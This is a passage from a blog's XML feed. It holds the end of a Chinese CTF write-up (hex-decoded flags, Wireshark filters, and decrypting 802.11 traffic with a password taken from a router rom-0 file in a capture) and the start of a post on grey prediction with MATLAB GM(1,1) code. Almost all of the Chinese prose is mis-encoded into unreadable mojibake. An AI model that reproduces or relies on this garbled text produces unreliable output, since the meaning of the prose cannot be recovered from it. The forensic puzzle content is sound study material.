class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token punctuation">.</span><span class="token operator">-</span>å¼µ<span class="token number">337665727c</span>å¼µ <span class="token operator">==</span><span class="token operator">></span> <span class="token number">0x5f35</span><span class="token comment" spellcheck="true">#è¿›è¡Œæ‹¼æ¥</span><span class="token number">666c61677b6368317074756e655f35337665727c</span><span class="token comment" spellcheck="true">#å¯ä»¥å¾—åˆ°</span>flag<span class="token punctuation">{</span>ch1ptune_53ver<span class="token operator">|</span><span class="token comment" spellcheck="true">#æäº¤ch1ptune_53verå³å¯</span></code></pre><h3 id="Misc5-ç¥ç§˜çš„æ–‡ä»¶å-æœªè§£å‡º"><a href="#Misc5-ç¥ç§˜çš„æ–‡ä»¶å-æœªè§£å‡º" class="headerlink" title="Misc5-ç¥ç§˜çš„æ–‡ä»¶å(æœªè§£å‡º)"></a>Misc5-ç¥ç§˜çš„æ–‡ä»¶å(æœªè§£å‡º)</h3><blockquote><p> å¯ä»¥é€šè¿‡binwalkå¾—åˆ°ä¸€ä¸ªé€†å‘é¢˜ï¼Œè¾ƒéš¾ï¼Œæœªè§£å‡ºã€‚</p></blockquote><h2 id="ç½‘ç»œåè®®åˆ†æ"><a href="#ç½‘ç»œåè®®åˆ†æ" class="headerlink" title="ç½‘ç»œåè®®åˆ†æ"></a>ç½‘ç»œåè®®åˆ†æ</h2><h3 id="ç½‘ç»œåè®®åˆ†æ1-æ•°æ®åŒ…é‡Œæœ‰ç”œç”œåœˆå“¦"><a href="#ç½‘ç»œåè®®åˆ†æ1-æ•°æ®åŒ…é‡Œæœ‰ç”œç”œåœˆå“¦" class="headerlink" title="ç½‘ç»œåè®®åˆ†æ1-æ•°æ®åŒ…é‡Œæœ‰ç”œç”œåœˆå“¦~"></a>ç½‘ç»œåè®®åˆ†æ1-æ•°æ®åŒ…é‡Œæœ‰ç”œç”œåœˆå“¦~</h3><blockquote><p>wiresharkæ‰“å¼€æ•°æ®åŒ…åï¼Œä¾æ¬¡ä½¿ç”¨ä»¥ä¸‹è¿‡æ»¤è§„åˆ™:<br><code>http contains flag</code></p><p><code>tcp contains flag</code></p><p><code>udp contains flag</code></p><p>å³å¯é€šè¿‡<code>udp contains flag</code>æŸ¥åˆ°flagã€‚</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5eaff1fee2.png" class="lazyload"></p></blockquote><h3 id="ç½‘ç»œåè®®åˆ†æ2-å˜¿å˜¿å˜¿-æœªè§£å‡º"><a href="#ç½‘ç»œåè®®åˆ†æ2-å˜¿å˜¿å˜¿-æœªè§£å‡º" class="headerlink" title="ç½‘ç»œåè®®åˆ†æ2-å˜¿å˜¿å˜¿(æœªè§£å‡º)"></a>ç½‘ç»œåè®®åˆ†æ2-å˜¿å˜¿å˜¿(æœªè§£å‡º)</h3><blockquote><p>ç»è¿‡ç–¯ç‹‚æ‰‹åŠ¨æå–åå‘ç°åªèƒ½è·å¾—ä¸€ä¸å›¾ç‰‡ï¼Œèµ›åå¾—çŸ¥éœ€è¦ç”¨<strong>tcpflow</strong>è¿™ä¸ªç¥å™¨é‡æ„æŸå®³çš„tcpæ•°æ®ï¼Œä»è€Œå¾—åˆ°å›¾åƒã€‚</p></blockquote><h3 id="ç½‘ç»œåè®®åˆ†æ3-thief"><a href="#ç½‘ç»œåè®®åˆ†æ3-thief" class="headerlink" title="ç½‘ç»œåè®®åˆ†æ3-thief"></a>ç½‘ç»œåè®®åˆ†æ3-thief</h3><blockquote><p>æ‹¿åˆ°æ•°æ®åŒ…æ‰“å¼€åå‘ç°å¤§éƒ¨åˆ†éƒ½æ˜¯<code>802.11 wlan</code>æ•°æ®åŒ…ï¼Œè¿‡æ»¤ä¸€ä¸‹httpè¯·æ±‚ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5ebef87b2d.png" class="lazyload"></p><p>å¯ä»¥å‘ç°ç¬¬ä¸€ä¸ªè¯·æ±‚çš„æ˜¯<code>/rom-0</code>ï¼Œç¡®å®ä¸çŸ¥ä¸ºä½•å°±è§‰å¾—è¿™ä¸ªæ˜¯å…³é”®ï¼Œgoogleæœç´¢ä¸€ä¸‹ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5ed05ddbaa.png" class="lazyload"></p><p>ç‚¹è¿›routerPwnå‘ç°æ˜¯ä¸€ä¸ªè§£å‹rom-0æ–‡ä»¶çš„ç½‘å€ï¼Œé‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯è¿˜ç¼ºä¸€ä¸ªæ–‡ä»¶ã€‚æ¥ä¸‹æ¥é€šè¿‡å¯¼å‡ºhttpå¯¹è±¡ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°ä¸€ä¸ªrom0æ–‡ä»¶ï¼Œæ­£å¥½å°†å…¶è§£å¯†å¾—åˆ°ä»¥ä¸‹å†…å®¹ï¼š</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#çŒœæµ‹æ˜¯ç”¨æ¥è§£å¯†çš„å¯†é’¥å’¯</span>Rome4040TP<span class="token operator">-</span>LINKpublicpublicpublicpublic</code></pre><p>åœ¨è¿ç”¨wiresharkåˆ†ææµé‡çš„è¿‡ç¨‹ä¸­æˆ‘ä»¬ç»å¸¸éœ€è¦ä½¿ç”¨å¯†é’¥ä¹‹ç±»çš„ä¸œè¥¿æ¥è§£å¯†æµé‡ï¼Œæ­¤å¤„åŒæ ·é€šè¿‡ <a href="https://blog.csdn.net/neal_hddnwpu/article/details/82586235?utm_source=blogxgwz2" target="_blank" rel="noopener">æŸ¥è¯¢èµ„æ–™</a> å¯ä»¥è·å¾—è§£å¯†æ–¹å¼ï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5eefeb803c.png" class="lazyload"></p><p>å°†å¯†ç Rome4040å¯¼å…¥è§£å¯†ï¼Œå¯ä»¥å‘ç°çš„ç¡®å‡ºç°äº†<strong>å¾ˆå¤šhttpå’Œtcpçš„åŒ…</strong>ï¼Œæ ¹æ®é¢˜ç›®æç¤ºä½¿ç”¨è¿‡æ»¤<code>http contains CTF</code>å¾—åˆ°flagï¼š</p><p><img src="/images/placeholder.png" alt="" data-src="https://i.loli.net/2018/10/29/5bd5ef72cfc64.png" class="lazyload"></p></blockquote><blockquote><p>ğŸ†’wandoucup-CTF-WPåˆ°æ­¤ç»“æŸã€‚</p><p>Publish by Yof3ngğŸ‘Œã€‚</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> æµé‡åˆ†æ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ç°è‰²é¢„æµ‹</title>
      <link href="/2018/10/27/%E7%81%B0%E8%89%B2%E9%A2%84%E6%B5%8B/"/>
      <url>/2018/10/27/%E7%81%B0%E8%89%B2%E9%A2%84%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<p>â€¦â€¦</p><a id="more"></a><h1 id="ç°è‰²é¢„æµ‹ï¼ˆGrey-modelï¼‰"><a href="#ç°è‰²é¢„æµ‹ï¼ˆGrey-modelï¼‰" class="headerlink" title="ç°è‰²é¢„æµ‹ï¼ˆGrey modelï¼‰"></a>ç°è‰²é¢„æµ‹ï¼ˆGrey modelï¼‰</h1><blockquote><p>ç®€å•äº†è§£ä¸€ä¸‹ç°è‰²é¢„æµ‹è¿™ç©æ„å„¿ã€‚hahağŸ™‚</p></blockquote><h2 id="ä»€ä¹ˆæ˜¯ç°è‰²é¢„æµ‹ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯ç°è‰²é¢„æµ‹ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯ç°è‰²é¢„æµ‹ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯ç°è‰²é¢„æµ‹ï¼Ÿ</h2><blockquote><p>ç°è‰²ç†è®ºï¼š</p><p>é€šè¿‡å¯¹åŸå§‹æ•°æ®çš„å¤„ç†æŒ–æ˜ç³»ç»Ÿå˜åŠ¨è§„å¾‹ï¼Œå»ºç«‹ç›¸åº”å¾®åˆ†æ–¹ç¨‹ï¼Œä»è€Œé¢„æµ‹äº‹ç‰©æœªæ¥å‘å±•çŠ¶å†µã€‚ </p><ul><li>ä¼˜ç‚¹ï¼šå¯¹äºä¸ç¡®å®šå› ç´ çš„å¤æ‚ç³»ç»Ÿé¢„æµ‹æ•ˆæœè¾ƒå¥½ï¼Œä¸”æ‰€éœ€æ ·æœ¬æ•°æ®è¾ƒå°ï¼› </li><li>ç¼ºç‚¹ï¼šåŸºäºæŒ‡æ•°ç‡çš„é¢„æµ‹æ²¡æœ‰è€ƒè™‘ç³»ç»Ÿçš„éšæœºæ€§ï¼Œä¸­é•¿æœŸé¢„æµ‹ç²¾åº¦è¾ƒå·®ã€‚</li></ul><p>ç™¾åº¦ç™¾ç§‘æ˜¯è¿™ä¹ˆè¯´çš„ï¼š</p><p><a href="https://baike.baidu.com/item/%E7%81%B0%E8%89%B2%E9%A2%84%E6%B5%8B/7534704" target="_blank" rel="noopener">ç°è‰²é¢„æµ‹</a>æ˜¯å°±<a href="https://baike.baidu.com/item/%E7%81%B0%E8%89%B2%E7%B3%BB%E7%BB%9F/9595581" target="_blank" rel="noopener">ç°è‰²ç³»ç»Ÿ</a>ã€ç°è‰²ç³»ç»Ÿæ˜¯æŒ‡â€œéƒ¨åˆ†ä¿¡æ¯å·²çŸ¥ï¼Œéƒ¨åˆ†ä¿¡æ¯æœªçŸ¥â€œçš„â€å°æ ·æœ¬â€œï¼Œâ€è´«ä¿¡æ¯â€œçš„ä¸ç¡®å®šç³»ç»Ÿï¼Œä»¥ç°è‰²æ¨¡å‹ï¼ˆG,Mï¼‰ä¸ºæ ¸å¿ƒçš„æ¨¡å‹ä½“ç³»ã€‚ã€‘æ‰€åšçš„é¢„æµ‹ã€‚æ‰€è°“ç°è‰²ç³»ç»Ÿæ˜¯ä»‹äºç™½è‰²ç³»ç»Ÿå’Œé»‘ç®±ç³»ç»Ÿä¹‹é—´çš„è¿‡æ¸¡ç³»ç»Ÿã€‚å…¶å…·ä½“çš„å«ä¹‰æ˜¯:å¦‚æœæŸä¸€ç³»ç»Ÿçš„å…¨éƒ¨ä¿¡æ¯å·²çŸ¥ä¸ºç™½è‰²ç³»ç»Ÿï¼Œå…¨éƒ¨ä¿¡æ¯æœªçŸ¥ä¸ºé»‘ç®±ç³»ç»Ÿï¼Œéƒ¨åˆ†ä¿¡æ¯å·²çŸ¥ï¼Œéƒ¨åˆ†ä¿¡æ¯æœªçŸ¥ï¼Œé‚£ä¹ˆè¿™ä¸€ç³»ç»Ÿå°±æ˜¯ç°è‰²ç³»ç»Ÿã€‚</p></blockquote><h2 id="é‚£ä¹ˆä»€ä¹ˆåˆæ˜¯ç°è‰²é¢„æµ‹æ³•å‘¢ï¼Ÿ"><a href="#é‚£ä¹ˆä»€ä¹ˆåˆæ˜¯ç°è‰²é¢„æµ‹æ³•å‘¢ï¼Ÿ" class="headerlink" title="é‚£ä¹ˆä»€ä¹ˆåˆæ˜¯ç°è‰²é¢„æµ‹æ³•å‘¢ï¼Ÿ"></a>é‚£ä¹ˆä»€ä¹ˆåˆæ˜¯ç°è‰²é¢„æµ‹æ³•å‘¢ï¼Ÿ</h2><blockquote><p>ä¸€èˆ¬åœ°è¯´ï¼Œ<a href="https://baike.baidu.com/item/%E7%A4%BE%E4%BC%9A%E7%B3%BB%E7%BB%9F" target="_blank" rel="noopener">ç¤¾ä¼šç³»ç»Ÿ</a>ã€<a href="https://baike.baidu.com/item/%E7%BB%8F%E6%B5%8E%E7%B3%BB%E7%BB%9F/3897147" target="_blank" rel="noopener">ç»æµç³»ç»Ÿ</a>ã€ç”Ÿæ€ç³»ç»Ÿéƒ½æ˜¯ç°è‰²ç³»ç»Ÿã€‚ä¾‹å¦‚ç‰©ä»·ç³»ç»Ÿï¼Œå¯¼è‡´ç‰©ä»·ä¸Šæ¶¨çš„å› ç´ å¾ˆå¤šï¼Œä½†å·²çŸ¥çš„å´ä¸å¤šï¼Œå› æ­¤å¯¹ç‰©ä»·è¿™ä¸€ç°è‰²ç³»ç»Ÿçš„é¢„æµ‹å¯ä»¥ç”¨ç°è‰²é¢„æµ‹æ–¹æ³•ã€‚</p></blockquote><h2 id="ç°è‰²æ¨¡å‹çš„åº”ç”¨"><a href="#ç°è‰²æ¨¡å‹çš„åº”ç”¨" class="headerlink" title="ç°è‰²æ¨¡å‹çš„åº”ç”¨"></a>ç°è‰²æ¨¡å‹çš„åº”ç”¨</h2><blockquote><p>1ã€æ•°åˆ—é¢„æµ‹ã€‚å¯¹æŸç°è±¡éšæ—¶é—´çš„é¡ºå»¶è€Œå‘ç”Ÿçš„å˜åŒ–æ‰€åšçš„é¢„æµ‹å®šä¹‰ä¸ºæ•°åˆ—é¢„æµ‹ã€‚ä¾‹å¦‚å¯¹<a href="https://baike.baidu.com/item/%E6%B6%88%E8%B4%B9%E7%89%A9%E4%BB%B7%E6%8C%87%E6%95%B0" target="_blank" rel="noopener">æ¶ˆè´¹ç‰©ä»·æŒ‡æ•°</a>çš„é¢„æµ‹ï¼Œéœ€è¦ç¡®å®šä¸¤ä¸ªå˜é‡ï¼Œä¸€ä¸ªæ˜¯æ¶ˆè´¹ç‰©ä»·æŒ‡æ•°çš„æ°´å¹³ã€‚å¦ä¸€ä¸ªæ˜¯è¿™ä¸€æ°´å¹³æ‰€å‘ç”Ÿçš„æ—¶é—´ã€‚</p><p>2ã€ç¾å˜é¢„æµ‹ã€‚å¯¹å‘ç”Ÿç¾å®³æˆ–å¼‚å¸¸çªå˜æ—¶é—´å¯èƒ½å‘ç”Ÿçš„æ—¶é—´é¢„æµ‹ç§°ä¸ºç¾å˜é¢„æµ‹ã€‚ä¾‹å¦‚å¯¹åœ°éœ‡æ—¶é—´çš„é¢„æµ‹ã€‚</p><p>3ã€å­£èŠ‚æ€§ç¾å˜é¢„æµ‹ã€‚å¯¹å‘ç”Ÿåœ¨æ¯å¹´ç‰¹å®šæ—¶åŒºçš„äº‹ä»¶æˆ–å‘½é¢˜ä½œç°é¢„æµ‹ï¼Œç§°å­£èŠ‚ç¾å˜ç°é¢„æµ‹ã€‚</p><p>4ã€æ‹“æ‰‘é¢„æµ‹ã€‚å°†åŸå§‹æ•°æ®ä½œæ›²çº¿ï¼Œåœ¨æ›²çº¿ä¸ŠæŒ‰å®šå€¼å¯»æ‰¾è¯¥å®šå€¼å‘ç”Ÿçš„æ‰€æœ‰<a href="https://baike.baidu.com/item/%E6%97%B6%E7%82%B9" target="_blank" rel="noopener">æ—¶ç‚¹</a>ï¼Œå¹¶ä»¥è¯¥å®šå€¼ä¸ºæ¡†æ¶æ„æˆ<a href="https://baike.baidu.com/item/%E6%97%B6%E7%82%B9%E6%95%B0%E5%88%97" target="_blank" rel="noopener">æ—¶ç‚¹æ•°åˆ—</a>ï¼Œç„¶åå»ºç«‹æ¨¡å‹é¢„æµ‹æœªæ¥è¯¥å®šå€¼æ‰€å‘ç”Ÿçš„æ—¶ç‚¹ã€‚</p><p>5ã€<a href="https://baike.baidu.com/item/%E7%B3%BB%E7%BB%9F%E9%A2%84%E6%B5%8B/12609292" target="_blank" rel="noopener">ç³»ç»Ÿé¢„æµ‹</a>ã€‚å¯¹ç³»ç»Ÿä¸­ä¼—å¤šå˜é‡é—´ç›¸äº’åè°ƒå…³ç³»çš„å‘å±•å˜åŒ–æ‰€è¿›è¡Œçš„é¢„æµ‹ç§°ä¸ºç³»ç»Ÿé¢„æµ‹ã€‚ä¾‹å¦‚å¸‚åœºä¸­<a href="https://baike.baidu.com/item/%E6%9B%BF%E4%BB%A3%E5%95%86%E5%93%81" target="_blank" rel="noopener">æ›¿ä»£å•†å“</a>ã€ç›¸äº’å…³è”å•†å“<a href="https://baike.baidu.com/item/%E9%94%80%E5%94%AE%E9%87%8F" target="_blank" rel="noopener">é”€å”®é‡</a>äº’ç›¸åˆ¶çº¦çš„é¢„æµ‹ã€‚</p><p>6ã€åŒ…ç»œç°é¢„æµ‹ã€‚å¯¹äºéš¾ä»¥ç”¨æ•°åˆ—é¢„æµ‹æˆ–ç¾å˜é¢„æµ‹å¤„ç†ï¼Œä¹Ÿä¸å¿…ç”¨æ‹“æ‰‘é¢„æµ‹è®¡ç®—çš„ç¦»ä¹±åºåˆ—ï¼Œå¯ä»¥æ„é€ ä¸Šè¾¹ç•Œ GM(1ï¼Œ1) ä¸ä¸‹è¾¹ç•Œ GM(1ï¼Œ1) è¿›è¡Œè¦†ç›–ï¼Œè¿™ç§è¾¹ç•Œæ¨¡å‹å³åŒ…ç»œæ¨¡å‹ã€‚</p></blockquote><h2 id="ç°è‰²æ¨¡å‹æµ‹è¯•"><a href="#ç°è‰²æ¨¡å‹æµ‹è¯•" class="headerlink" title="ç°è‰²æ¨¡å‹æµ‹è¯•"></a>ç°è‰²æ¨¡å‹æµ‹è¯•</h2><p>ä»¥sin(pi*x/20)å‡½æ•°ä¸ºä¾‹ï¼Œä»¥å•è°ƒæ€§ä¸ºåŒºé—´æ£€éªŒç°è‰²æ¨¡å‹é¢„æµ‹çš„ç²¾åº¦ ã€‚</p><pre class=" language-matlab"><code class="language-matlab"><span class="token comment" spellcheck="true">%æ‘˜è‡ªAngel_kittyå¸ˆå‚…çš„matlabç¨‹åºä»£ç </span>clcclear all<span class="token comment" spellcheck="true">% æœ¬ç¨‹åºä¸»è¦ç”¨æ¥è®¡ç®—æ ¹æ®ç°è‰²ç†è®ºå»ºç«‹çš„æ¨¡å‹çš„é¢„æµ‹å€¼ã€‚</span><span class="token comment" spellcheck="true">% åº”ç”¨çš„æ•°å­¦æ¨¡å‹æ˜¯ GM(1,1)ã€‚</span><span class="token comment" spellcheck="true">% åŸå§‹æ•°æ®çš„å¤„ç†æ–¹æ³•æ˜¯ä¸€æ¬¡ç´¯åŠ æ³•ã€‚</span>x<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>x1<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>x2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>y<span class="token operator">=</span><span class="token function">sin</span><span class="token punctuation">(</span><span class="token keyword">pi</span><span class="token operator">*</span>x<span class="token operator">/</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>n<span class="token operator">=</span><span class="token function">length</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">;</span>yy<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">yy</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n    <span class="token function">yy</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yy</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>B<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n<span class="token number">-1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token punctuation">(</span>n<span class="token number">-1</span><span class="token punctuation">)</span>    <span class="token function">B</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token function">yy</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">yy</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>    <span class="token function">B</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">end</span>BT<span class="token operator">=</span>B<span class="token operator">'</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n<span class="token number">-1</span>    <span class="token function">YN</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>YN<span class="token operator">=</span>YN<span class="token operator">'</span><span class="token punctuation">;</span>A<span class="token operator">=</span><span class="token function">inv</span><span class="token punctuation">(</span>BT<span class="token operator">*</span>B<span class="token punctuation">)</span><span class="token operator">*</span>BT<span class="token operator">*</span>YN<span class="token punctuation">;</span>a<span class="token operator">=</span><span class="token function">A</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>u<span class="token operator">=</span><span class="token function">A</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>t<span class="token operator">=</span>u<span class="token operator">/</span>a<span class="token punctuation">;</span>t_test<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">%éœ€è¦é¢„æµ‹ä¸ªæ•°</span><span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>t_test<span class="token operator">+</span>n<span class="token punctuation">;</span><span class="token function">yys</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">-</span>t<span class="token punctuation">)</span><span class="token operator">.*</span><span class="token function">exp</span><span class="token punctuation">(</span><span class="token operator">-</span>a<span class="token operator">.*</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span>t<span class="token punctuation">;</span><span class="token function">yys</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">j</span><span class="token operator">=</span>n<span class="token operator">+</span>t_test<span class="token operator">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span><span class="token number">2</span>    <span class="token function">ys</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yys</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">yys</span><span class="token punctuation">(</span><span class="token number">j</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>x<span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span>n<span class="token punctuation">;</span>xs<span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n<span class="token operator">+</span>t_test<span class="token punctuation">;</span>yn<span class="token operator">=</span><span class="token function">ys</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">:</span>n<span class="token operator">+</span>t_test<span class="token punctuation">)</span><span class="token punctuation">;</span>det<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n    det<span class="token operator">=</span>det<span class="token operator">+</span><span class="token function">abs</span><span class="token punctuation">(</span><span class="token function">yn</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token function">y</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>det<span class="token operator">=</span>det<span class="token operator">/</span><span class="token punctuation">(</span>n<span class="token number">-1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">subplot</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">plot</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span><span class="token string">'^r-'</span><span class="token punctuation">,</span>xs<span class="token punctuation">,</span>yn<span class="token punctuation">,</span><span class="token string">'b-o'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">title</span><span class="token punctuation">(</span><span class="token string">'å•è°ƒé€’å¢'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">legend</span><span class="token punctuation">(</span><span class="token string">'å®æµ‹å€¼'</span><span class="token punctuation">,</span><span class="token string">'é¢„æµ‹å€¼'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'ç™¾åˆ†ç»å¯¹è¯¯å·®ä¸ºï¼š'</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span>det<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'%'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">disp</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'é¢„æµ‹å€¼ä¸ºï¼š '</span><span class="token punctuation">,</span><span class="token function">num2str</span><span class="token punctuation">(</span><span class="token function">ys</span><span class="token punctuation">(</span>n<span class="token operator">+</span><span class="token number">1</span><span class="token operator">:</span>n<span class="token operator">+</span>t_test<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">%é€’å‡</span>y1<span class="token operator">=</span><span class="token function">sin</span><span class="token punctuation">(</span><span class="token keyword">pi</span><span class="token operator">*</span>x1<span class="token operator">/</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>n1<span class="token operator">=</span><span class="token function">length</span><span class="token punctuation">(</span>y1<span class="token punctuation">)</span><span class="token punctuation">;</span>yy1<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n1<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">yy1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">2</span><span class="token operator">:</span>n1    <span class="token function">yy1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token function">yy1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">y1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">end</span>B1<span class="token operator">=</span><span class="token function">ones</span><span class="token punctuation">(</span>n1<span class="token number">-1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token number">i</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">:</span><span class="token punctuation">(</span>n1<span class="token number">-1</span><span class="token punctuation">)</span>    <span class="token function">B1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token function">yy1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">yy1</span><span class="token punctuation">(</span><span class="token number">i</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span>   